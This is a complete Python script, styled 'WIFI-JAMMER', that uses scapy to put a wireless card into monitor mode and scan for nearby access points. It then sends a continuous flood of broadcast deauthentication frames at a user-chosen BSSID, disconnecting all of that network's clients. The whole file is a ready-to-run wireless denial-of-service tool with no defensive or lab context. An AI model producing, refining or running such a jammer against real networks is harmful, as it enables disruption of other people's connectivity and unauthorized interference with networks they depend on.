#!/usr/bin/env python3
import os
import re
import sys
import time
import shutil
import subprocess
from scapy.all import (RadioTap, Dot11, Dot11Deauth, sendp, sniff, 
                      Dot11Beacon, Dot11Elt, conf)

# Colors
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"

def check_dependencies():
    """Verify required tools are installed"""
    missing = []
    
    # Check scapy
    try:
        import scapy
    except ImportError:
        missing.append("scapy (pip install scapy)")
    
    # Check iwconfig
    if not shutil.which('iwconfig'):
        missing.append("wireless-tools (apt install wireless-tools)")
    
    if missing:
        print(f"{RED}[-] Missing dependencies:{RESET}")
        for dep in missing:
            print(f"  - {dep}")
        sys.exit(1)

def display_ascii_art():
    """Show styled title"""
    try:
        art = subprocess.run(
            ['toilet', '-f', 'bigmono9', '-w', '100', 'WIFI-JAMMER'],
            capture_output=True, text=True
        ).stdout
        print(f"{GREEN}{art}{RESET}")
    except:
        print(f"{GREEN}\n  WIFI JAMMER\n{RESET}")

def get_wireless_interfaces():
    """Get available wireless interfaces"""
    interfaces = []
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        interfaces = [line.split()[0] 
                     for line in result.stdout.splitlines() 
                     if "IEEE 802.11" in line]
    except Exception as e:
        print(f"{RED}[-] Error detecting interfaces: {e}{RESET}")
    return interfaces

def set_monitor_mode(interface):
    """Configure interface in monitor mode"""
    print(f"{YELLOW}[*] Configuring {interface}...{RESET}")
    
    commands = [
        ["ifconfig", interface, "down"],
        ["iwconfig", interface, "mode", "monitor"],
        ["ifconfig", interface, "up"]
    ]
    
    for cmd in commands:
        try:
            subprocess.run(["sudo"] + cmd, check=True)
        except subprocess.CalledProcessError as e:
            print(f"{RED}[-] Failed: {' '.join(cmd)} - {e}{RESET}")
            return False
    
    # Verify mode
    result = subprocess.run(["iwconfig", interface], capture_output=True, text=True)
    if "Mode:Monitor" in result.stdout:
        print(f"{GREEN}[+] {interface} in monitor mode{RESET}")
        return True
    else:
        print(f"{RED}[-] Failed to set monitor mode{RESET}")
        return False

def scan_networks(interface, duration=10):
    """Scan for nearby WiFi networks"""
    networks = {}
    print(f"{YELLOW}[*] Scanning for {duration}s...{RESET}")

    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            try:
                bssid = pkt[Dot11].addr2
                ssid = pkt[Dot11Elt].info.decode('utf-8', 'ignore') or "<hidden>"
                try:
                    dbm = pkt.dBm_AntSignal
                except:
                    dbm = "N/A"
                
                if bssid not in networks:
                    networks[bssid] = {
                        'ssid': ssid,
                        'dbm': dbm,
                        'channel': int(ord(pkt[Dot11Elt:3].info))
                    }
            except Exception as e:
                pass

    sniff(iface=interface, prn=packet_handler, timeout=duration)
    return networks

def deauth_target(interface, target_bssid, count=10, interval=0.1, duration=30):
    """Launch deauthentication attack"""
    print(f"{YELLOW}[*] Targeting {target_bssid}{RESET}")
    
    # Target all clients (broadcast)
    packet = RadioTap() / Dot11(
        addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
        addr2=target_bssid,          # AP MAC
        addr3=target_bssid            # AP MAC
    ) / Dot11Deauth(reason=7)         # 7 = Class 3 frame received from nonassociated STA
    
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            sendp(packet, iface=interface, count=count, inter=interval, verbose=False)
            print(f"{GREEN}[+] Sent {count} deauth packets{RESET}")
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Stopped attack{RESET}")

def main():
    check_dependencies()
    display_ascii_art()
    
    # Get interfaces
    interfaces = get_wireless_interfaces()
    if not interfaces:
        print(f"{RED}[-] No wireless interfaces found{RESET}")
        sys.exit(1)
    
    # Interface selection
    print(f"{GREEN}[+] Available interfaces:{RESET}")
    for i, iface in enumerate(interfaces):
        print(f"  {i+1}. {iface}")
    
    try:
        choice = int(input(f"{YELLOW}[?] Select interface: {RESET}")) - 1
        iface = interfaces[choice]
    except (ValueError, IndexError):
        print(f"{RED}[-] Invalid selection{RESET}")
        sys.exit(1)
    
    # Set monitor mode
    if not set_monitor_mode(iface):
        sys.exit(1)
    
    # Network scan
    networks = scan_networks(iface)
    if not networks:
        print(f"{RED}[-] No networks found{RESET}")
        sys.exit(1)
    
    print(f"\n{GREEN}[+] Discovered networks:{RESET}")
    for i, (bssid, info) in enumerate(networks.items()):
        print(f"  {i+1}. {info['ssid']} ({bssid}) | Channel: {info['channel']} | Signal: {info['dbm']} dBm")
    
    # Target selection
    try:
        target = input(f"{YELLOW}[?] Enter target BSSID: {RESET}").strip()
        if target not in networks:
            print(f"{RED}[-] Invalid BSSID{RESET}")
            sys.exit(1)
    except KeyboardInterrupt:
        sys.exit(0)
    
    # Launch attack
    try:
        deauth_target(iface, target)
    except PermissionError:
        print(f"{RED}[-] Need root privileges!{RESET}")
        sys.exit(1)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{RED}[-] Run as root!{RESET}")
        sys.exit(1)
    main()
